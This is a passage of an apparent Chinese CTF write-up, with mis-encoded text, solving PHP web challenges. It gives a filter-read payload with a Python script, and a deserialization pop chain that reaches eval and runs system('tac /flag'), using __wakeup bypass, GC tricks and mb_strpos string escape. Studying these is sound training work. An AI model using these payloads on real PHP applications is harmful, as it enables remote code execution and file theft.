class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>114514Âà∞Â∫ïÊòØÂï•ÊÑèÊÄùÂòûÔºü„ÄÇÔºü</code></pre><ol><li><strong>intval</strong> Êúâ‰∏Ä‰∏™ÁâπÊÄß„ÄÇËæìÂÖ•ÁöÑÂÄºÂ¶ÇÊûúÊòØÂ≠óÁ¨¶‰∏≤ÔºåÂÆÉËøîÂõûÁöÑÂÜÖÂÆπÂèñÂÜ≥‰∫éÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶Â∑¶‰æßÁöÑÊï∞Â≠ó„ÄÇÂ¶Ç intval(‚Äò11a22‚Äô)&#x3D;11„ÄÇ</li><li><strong>ctype_alpha</strong> ‚Äî ÂÅöÁ∫ØÂ≠óÁ¨¶Ê£ÄÊµã„ÄÇ‚Äî‚ÄîÂ¶ÇÊûúÂú®ÂΩìÂâçËØ≠Ë®ÄÁéØÂ¢É‰∏≠ text ÈáåÁöÑÊØè‰∏™Â≠óÁ¨¶ÈÉΩÊòØ‰∏Ä‰∏™Â≠óÊØçÔºåÈÇ£‰πàÂ∞±ËøîÂõûtrueÔºåÂèç‰πãÂàôËøîÂõûfalse„ÄÇ</li><li><strong>regexp</strong> ÊúÄÂ§ßÂõûÊ∫Ø</li><li>php ÂéüÁîüÁ±ª</li></ol><p>Payload:</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">GET</span><span class="token punctuation">:</span> <span class="token header-value">?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString</span></span><span class="token header"><span class="token header-name keyword">POST</span><span class="token punctuation">:</span> <span class="token header-value">"hsad"*1000000+"HACKER"</span></span></code></pre><p>‰πüÂèØ‰ª•python‰∏ÄÊääÊ¢≠</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:48615/"</span>params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"e[m.p"</span><span class="token punctuation">:</span> <span class="token number">114514.1</span><span class="token punctuation">,</span>    <span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token string">"SplFileObject"</span><span class="token punctuation">,</span>    <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">,</span>    <span class="token string">"c"</span><span class="token punctuation">:</span> <span class="token string">"__toString"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"try"</span><span class="token punctuation">:</span> <span class="token string">"hsad"</span><span class="token operator">*</span><span class="token number">250001</span><span class="token operator">+</span><span class="token string">"HACKER"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># flag = "PD9waHAgPUJhc2VDVEZ7YWZhYzU2NjYtZWI2Yy00MGQ5LWJmMTUtYmQyYmY4OTk1MmQwfT8+Cg=="</span><span class="token comment"># decoded_flag = base64.b64decode(flag)</span><span class="token comment"># print(decoded_flag)</span></code></pre><h4 id="ez-php-gcÂõûÊî∂ÔºåÂºïÁî®ÁªïËøáÔºåÂèçÂ∫èÂàóÂåñÈÄÉÈÄ∏"><a href="#ez-php-gcÂõûÊî∂ÔºåÂºïÁî®ÁªïËøáÔºåÂèçÂ∫èÂàóÂåñÈÄÉÈÄ∏" class="headerlink" title="ez_php(gcÂõûÊî∂ÔºåÂºïÁî®ÁªïËøáÔºåÂèçÂ∫èÂàóÂåñÈÄÉÈÄ∏)"></a>ez_php(gcÂõûÊî∂ÔºåÂºïÁî®ÁªïËøáÔºåÂèçÂ∫èÂàóÂåñÈÄÉÈÄ∏)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Hacker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$end</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">=</span><span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfer/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'HackerÔºÅ'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"C"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">T</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$e</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">e</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">R</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$r</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ez_ser.from_you'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;&#123;&#123;'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ez_ser.from_you'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&#125;&#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[|\]/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NONONO!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$pre</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"substr"</span><span class="token punctuation">;</span>    <span class="token variable">$ser_ctf</span> <span class="token operator">=</span> <span class="token function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$pre</span><span class="token operator">.</span><span class="token string double-quoted-string">"["</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser_ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÊùÇÈ±º~ÊùÇÈ±º~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ÂÖàÊòØpopÈìæÂ≠ê</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Hacker</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">C</span><span class="token operator">::</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">T</span><span class="token operator">::</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">F</span><span class="token operator">::</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">E</span><span class="token operator">::</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">R</span><span class="token operator">::</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Êé•ÁùÄÊòØÁªï <code>__wakeup</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>‰∏ãËæπÊúâ‰∏Ä‰∏™ËµãÂÄºÁöÑÊìç‰ΩúÔºåÊâÄ‰ª•ÂèØ‰ª•‰ΩøÁî®ÂºïÁî®ÁªïËøáÔºåÂΩì<code>end</code>Âíå<code>username</code>Áõ∏‰∫íÂºïÁî®Êó∂Ôºå‰øÆÊîπ<code>end</code>ÁöÑÂÄº‰πüÊòØÂú®‰øÆÊîπ<code>username</code>ÁöÑÂÄº„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span></code></pre><p>Êé•ÁùÄÊòØÁªïËøá<code>throw new Exception(&quot;ÊùÇÈ±º~ÊùÇÈ±º~&quot;);</code>ÔºåËøôÈáåÊúâ‰∏Ä‰∏™ÂºÇÂ∏∏ÊäõÂá∫Ôºå‰ΩøÂæó<code>__destruct</code>Âπ∂‰∏çËÉΩËß¶ÂèëÔºåËøôÊó∂Â∞±ÈúÄË¶Å‰ΩøÁî®gcÂõûÊî∂ÁöÑÊú∫Âà∂Ôºå‰Ωø<code>__destruct</code>ÊèêÂâçËß¶ÂèëÔºåËÆ©<code>pop</code>ÈìæËÉΩÂ§üÂæÄÂêéËµ∞</p><p>ÂèÇËÄÉËøûÊé•Ôºö<a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHPÂèçÂ∫èÂàóÂåñ</a></p><p>Pop:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Hacker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$end</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">T</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$t</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$e</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">e</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">R</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$r</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">R</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">e</span><span class="token operator">-></span><span class="token property">r</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'2'</span><span class="token operator">=></span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// a:2:&#123;i:1;O:6:"Hacker":3:&#123;s:5:"start";O:1:"C":1:&#123;s:1:"c";O:1:"T":1:&#123;s:1:"t";O:1:"F":1:&#123;s:1:"f";O:1:"E":1:&#123;s:1:"e";O:1:"R":1:&#123;s:1:"r";s:20:"system('tac /flag');";&#125;&#125;&#125;&#125;&#125;s:3:"end";N;s:8:"username";R:9;&#125;i:1;N;&#125;</span></span></code></pre><p>Â∞ÜÊúÄÂêé<code>i:2;N;</code>ÊõøÊç¢‰∏∫<code>i:1;N;</code>Âà©Áî®gcÂõûÊî∂‰Ωø<code>__destruct</code>ÊèêÂâçËß¶Âèë</p><p>ÁâπÊÆäÂèòÈáèÂêç <code>ez_ser.from_you</code>Ôºå‰º†ÂÖ•<code>ez[ser.from_you</code>Âç≥ÂèØÁªïËøá</p><p>Êé•‰∏ãÊù•Â∞±ÊòØÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ÂèÇËÄÉÈìæÊé• <a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">CTFshow_XGCTF_Ezzz_php</a>  <a href="https://www.cnblogs.com/gxngxngxn/p/18187578">mb_strpos‰∏émb_substrÊâßË°åÂ∑ÆÂºÇÂØºËá¥ÁöÑÊºèÊ¥û</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">ÊØèÂèëÈÄÅ‰∏Ä‰∏™%f0abcÔºåmb_strposËÆ§‰∏∫ÊòØ4‰∏™Â≠óËäÇÔºåmb_substrËÆ§‰∏∫ÊòØ1‰∏™Â≠óËäÇÔºåÁõ∏Â∑Æ3‰∏™Â≠óËäÇÊØèÂèëÈÄÅ‰∏Ä‰∏™%f0%9fab,mb_strposËÆ§‰∏∫ÊòØ3‰∏™Â≠óËäÇÔºåmb_substrËÆ§‰∏∫ÊòØ1‰∏™Â≠óËäÇÔºåÁõ∏Â∑Æ2‰∏™Â≠óËäÇÊØèÂèëÈÄÅ‰∏Ä‰∏™%f0%9f%9fa,mb_strposËÆ§‰∏∫ÊòØ2‰∏™Â≠óËäÇÔºåmb_substrËÆ§‰∏∫ÊòØ1‰∏™Â≠óËäÇÔºåÁõ∏Â∑Æ1‰∏™Â≠óËäÇ</code></pre><p><img src="ez_php.png" loading="lazy"></p><p><img src="ez_php2.png" loading="lazy"></p><p>‰∫éÊòØÊûÑÈÄ†ÁªïËøá‰πãÂâçÂ§ö‰ΩôÂ≠óÁ¨¶‰∏≤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">210</span><span class="token punctuation">:</span>"<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">?</span>substr<span class="token operator">=</span><span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">&amp;</span>ez<span class="token punctuation">[</span>ser<span class="token operator">.</span>from_you<span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"T"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"t"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"F"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"E"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"R"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span><span class="token 